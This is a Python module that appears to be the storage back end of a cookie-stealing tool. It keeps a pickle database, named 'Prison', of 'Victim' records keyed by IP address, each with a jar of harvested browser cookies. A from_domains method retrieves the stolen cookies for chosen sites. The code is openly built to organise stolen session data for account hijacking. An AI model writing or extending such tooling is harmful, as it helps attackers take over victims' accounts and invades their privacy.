import pickle
import os
from datetime import timezone, datetime


class Prison:
    def __init__(self, filename="prison.db") -> None:
        self.filename = filename
        self.victims = self._load_db() or self._create_db()

    def _create_db(self):
        with open(self.filename, "wb") as f:
            pickle.dump([], f)
        return []

    def _save_db(self):
        with open(self.filename, "wb") as f:
            pickle.dump(self.victims, f)

    def _load_db(self):
        if os.path.exists(self.filename):
            with open(self.filename, "rb") as f:
                return pickle.load(f)
        return False

    def add_victim(self, victim):
        if self._is_new_victim(victim):
            self.victims.append(victim)
        else:
            print(
                f"[-] Victim {victim.ip} already in data, skipping... (to be implemented)")

    def get_victim(self, ip):
        for victim in self.victims:
            if victim.ip == ip:
                return victim

    def _is_new_victim(self, new_victim):
        for victim in self.victims:
            if victim.ip == new_victim.ip:
                return False
        return True

    def from_domains(self, domains):
        result = {}
        for victim in self.victims:
            cookies = victim.cookies.from_domains(domains)
            if cookies:
                result[victim.ip] = cookies
        return result


class Cookie:
    def __init__(self, name, value, domain) -> None:
        self.name = name
        self.value = value
        self.domain = domain

    def __str__(self) -> str:
        return self.domain


class CookieJar:
    def __init__(self, cookies: list[Cookie]) -> None:
        self.cookies = {}
        for cookie in cookies:
            if cookie.domain not in self.cookies:
                self.cookies[cookie.domain] = []
            self.cookies[cookie.domain].append(cookie)

    def from_domains(self, domains: list):
        result = []
        for domain in domains:
            if domain in self.cookies:
                result.append(self.cookies[domain])
        return result


class Victim:
    def __init__(self, ip_address, date=datetime.now(timezone.utc)) -> None:
        self.ip = ip_address
        self.cookies = None
        self.date = date

    def get_date(self):
        return self.date.strftime("%d-%B-%Y (%H:%M:%S)")

    def update_cookies(self, cookie_jar):
        self.cookies = cookie_jar
